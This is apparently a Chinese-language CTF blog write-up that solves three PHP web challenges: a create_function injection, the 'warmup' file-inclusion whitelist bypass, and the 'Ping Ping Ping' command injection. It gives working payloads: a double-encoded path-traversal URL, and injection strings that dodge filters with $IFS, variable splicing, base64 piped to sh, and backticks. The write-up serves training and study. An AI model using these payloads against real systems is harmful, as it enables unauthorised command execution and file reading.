##### 关于creat_function

easyphp，靶场的一道题目

![](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20201223123848.png)

打开后对代码进行审计，看到一个函数create_function（）。那这个函数有什么作用？

在本地跑一下

![](https://tcakalr.gitee.io/tc/微信图片_202012231238483.png)

发现会出现一个不可见字符和lambda_1。

上百度查找，通过网上查找得到一些资料

![](https://tcakalr.gitee.io/tc/微信图片_202012231238481.png)

从资料得知create_function函数会创造一个匿名函数，

再查找csdn，找到了关于create_function的注入漏洞

![](https://tcakalr.gitee.io/tc/微信图片_202012231238482.png)

%d的值是会一直递增的。这里的`%d`会一直递增到最大长度直到结束。

再看回题目，create_function函数中就有cat /flag，那只要把函数名传入a，执行函数就可以得到flag。

但是函数名后面的数是会变的，可以用burp爆破

![](https://tcakalr.gitee.io/tc/微信图片_202012231238484.png)



## warmup

开局一张滑稽图。

查看页面源码后有提示。

![](https://tcakalr.gitee.io/tc/微信图片_20210129174700.png)



打开source.php看到代码

```
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

明显是一道代码审计，应该是一个文件包含的问题。

在做题前要搞清楚一些函数

\1. in_array() 函数搜索数组中是否存在指定的值

[![img](https://img2020.cnblogs.com/blog/1212355/202004/1212355-20200404221139054-429684887.png)](https://img2020.cnblogs.com/blog/1212355/202004/1212355-20200404221139054-429684887.png)

 更多信息参考:https://www.w3school.com.cn/php/func_array_in_array.asp

 \2. mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()

[![img](https://img2020.cnblogs.com/blog/1212355/202004/1212355-20200404221259287-140884573.png)](https://img2020.cnblogs.com/blog/1212355/202004/1212355-20200404221259287-140884573.png)

更多信息参考:https://www.runoob.com/php/func-string-mb_substr.html

\3. mb_strpos() 查找字符串在另一个字符串中首次出现的位置

[![img](https://img2020.cnblogs.com/blog/1212355/202004/1212355-20200404221719488-1249378930.png)](https://img2020.cnblogs.com/blog/1212355/202004/1212355-20200404221719488-1249378930.png) [![img](https://img2020.cnblogs.com/blog/1212355/202004/1212355-20200404221802464-436622086.png)](https://img2020.cnblogs.com/blog/1212355/202004/1212355-20200404221802464-436622086.png)

更多信息参考:https://www.php.net/manual/zh/function.mb-strpos.php

再看到代码中还有一个hint.php，打开发现flag不在flag里而在ffffllllaaaagggg里

![](https://tcakalr.gitee.io/tc/微信图片_202101291747001.png)

分析一下代码

最后一个if语句需要全部满足才能进入文件包含部分。

```
class emmm
    {
        public static function checkFile(&$page)

        {
            //白名单列表
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            //isset()判断变量是否声明is_string()判断变量是否是字符串 &&用了逻辑与两个值都为真才执行if里面的值
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it A";
                return false;
            }
            //检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
            if (in_array($page, $whitelist)) {
                return true;
            }
            //过滤问号的函数(//如果page含有?，则获取page第一个?前的值并赋给_page变量)
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );

             //第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
            if (in_array($_page, $whitelist)) {
                return true;
            }
            //url对$page解码
            $_page = urldecode($page);

            //第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            //第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
```

把代码拉出来跑一下，

```
 $_page = mb_substr(

                $page,

                0,

                mb_strpos($page . '?', '?')

            );

 if (in_array($_page, $whitelist)) {

                return true;

            }
```

可以发现只要$page里面没有?，mb_substr()就不会截取字符串，且mb_substr（）返回0.

```
$_page = urldecode($page);

            $_page = mb_substr(

                $_page,

                0,

                mb_strpos($_page . '?', '?')

            );

            if (in_array($_page, $whitelist)) {

                return true;

            }
```

第二段：

这里 $page经过了urldecode()解码赋值给了 $_page，需要注意的是，这里和第一段是不一样的。mb_strpos()和mb_substr()都是处理的 $_page，而非第一段的 $page。这里就是可利用点。我们要让这里出现？，就会返回true从而进入到文件包含中。

![微信图片_202101291747004](https://tcakalr.gitee.io/tc/微信图片_202101291747004.png)

***PHP中$_GET、$_POST、$_REQUEST这类函数在提取参数值时会URL解码一次*** ，再利用urldecode（）再解码一次就可以返回true了。

所以我们就可以构造payload了：

```
/index.php?file=source.php%253F/../../../../ffffllllaaaagggg
```

需要注意的是，这里之所以可以包含到ffffllllaaaagggg是因为PHP将 source.php%253F/ 视作了一个文件夹，然后 ../ 的用途是返回上级目录。

而ffffllllaaaagggg都是四次那么可能就是穿四层，当然，在没提示的情况下可以一层一层的试。

最后就可以读取出flag了。

![微信图片_20210129180826](https://tcakalr.gitee.io/tc/微信图片_20210129180826.png)

## [GXYCTF2019]Ping Ping Ping

打开题目，只有？ip写在上面

![微信图片_20210130111859](https://tcakalr.gitee.io/tc/微信图片_20210130111859.png)

既然题目都写了pingpingping了那就随便ping一下呗

![微信图片_202101301118595](https://tcakalr.gitee.io/tc/微信图片_202101301118595.png)



有了request，然后就直接cat /flag

![微信图片_202101301118591](https://tcakalr.gitee.io/tc/微信图片_202101301118591.png)

被过滤了，那就ls一下试试

![微信图片_202101301118592](https://tcakalr.gitee.io/tc/微信图片_202101301118592.png)

看一下index.php

![微信图片_20210130112710](https://tcakalr.gitee.io/tc/微信图片_20210130112710.png)

明显应该是过滤空格了  ，过滤空格有几种符号可以绕过

```
${IFS}
${IFS}$
$IFS$加任意数字
```

绕过空格后看到index.php的内容

![微信图片_202101301118594](https://tcakalr.gitee.io/tc/微信图片_202101301118594.png)

过滤了什么就很清楚了，空格，bash，flag等都被过滤了

这里的最后一句不是很懂，上游览器查了一下，解释如下：

![微信图片_20210130113241](https://tcakalr.gitee.io/tc/微信图片_20210130113241.png)

应该就是按一个顺序匹配。

要得到flag有三种方法，当然也有可能有更多但是我想到了三种。

#### 第一种：拼接

```
例如：CODE
a=c;b=at;c=flag;$a$b $c
a=cat;b=/fl;c=ag;$a$IFS$9$b$c;
```

既然过滤掉flag那就拼接就行

有如下四种拼接方法，但是都试过后只有一种的出flag

```bash
?ip=127.0.0.1;a=f;cat$IFS$1$alag.php    过滤
?ip=127.0.0.1;a=l;cat$IFS$1f$aag.php	有request，但没flag
?ip=127.0.0.1;a=a;cat$IFS$1fl$ag.php  	过滤
?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php	有flag
```

第三种就是刚才说的按顺序出现了flag。

#### 第二种：base64编码

虽然bash被过滤了，但是sh没有。

我们就可以用base64编码一下flag，从而达到绕过的作用。

例子：

```
CODE
echo "bHM="|base64 -d|bash  
```

这个和

```
CODE
bash ls
```

是有相同效果的。

据此我们就可构造payload

```
?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

```bash
Y2F0IGZsYWcucGhw是cat flag.php的base64-encode
```

这样就可以得到flag了

![微信图片_20210130114547](https://tcakalr.gitee.io/tc/微信图片_20210130114547.png)

#### 第三种：内联执行

```bash
?ip=127.0.0.1;cat$IFS$1`ls`
```

payload是这样的，那他是个什么意思呢？

解释如下：

```bash
方法名叫内联执行
方法:将反引号内命令的输出作为输入执行
```

即我用ls得出来的变成输入执行，即等价于我cat flag.php和index.php，这两个php文件是ls出来的。

最终就可以得到flag

![微信图片_20210130114831](https://tcakalr.gitee.io/tc/微信图片_20210130114831.png)

这是这一题可以用到的知识点，当然还有许多的知识未用到

这里有链接，里面的文章做了比较详细的一些总结：

https://www.ghtwf01.cn/index.php/archives/273/#menu_index_10